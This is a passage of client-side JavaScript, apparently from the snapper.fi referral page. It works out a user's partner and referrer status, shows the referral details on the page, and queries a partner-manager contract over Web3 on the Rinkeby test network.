		referer_2.substring(0, 2) != '0x' && //exl. second referer
		partner_aff.substring(0, 2) != '0x' && //exl. partner multilevel
		partner_aff.length == 4) {
			ref = {
				status: partnerName,
				quote: quote,
				referer: splitter,
				quote_2: '0%',
				referer_2: 'NaN',
				link: 'https://snapper.fi/partner.html'
			}
	}
	// PARTNER + REFERER
	else if (
		referer.substring(0, 2) == '0x' &&
		referer_2.substring(0, 2) != '0x' &&
		partner_aff.substring(0, 2) != '0x' &&
		partner_aff.length == 4) {
			ref = {
				status: partnerName,
				quote: quote,
				referer: splitter,
				quote_2: quote_ref,
				referer_2: referer,
				link: 'https://snapper.fi/partner.html'
			}
	}
	// NO REFERRER
	else {}

	//document.getElementById("isPartner").innerHTML = isPartner;

	document.getElementById('ref_status').innerHTML = 'Referral Status: ' + ref.status;
	document.getElementById('ref_quote').innerHTML = 'Referral Quote: ' + ref.quote;
	document.getElementById('ref_referer').innerHTML = 'Referer Address: ' + ref.referer;
	document.getElementById('ref_quote_2').innerHTML = 'Quote 2nd Referer: ' + ref.quote_2;
	document.getElementById('ref_referer_2').innerHTML = 'Address 2nd Referer: ' + ref.referer_2;
	document.getElementById('ref_link').innerHTML = 'More info about Partner Program: ' + ref.link;
}

function disableSubmit() {
	document.getElementById("submit").disabled = false;
   }
  
function activateButton(element) {
	if(element.checked) {
		document.getElementById("submit").disabled = false;
	}
	else  {
		document.getElementById("submit").disabled = true;
	}
}

async function refererWeb3() {
	web3 = new Web3(new Web3.providers.HttpProvider("https://rinkeby.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"));
	
	let { refererCall } = checkPartners();
	const managerCall = new web3.eth.Contract(partnerManager.abi, partnerManager.address);
	managerP = await managerCall.methods.partner(refererCall).call().then();
	document.getElementById("partner_bool").innerHTML = managerP;
}
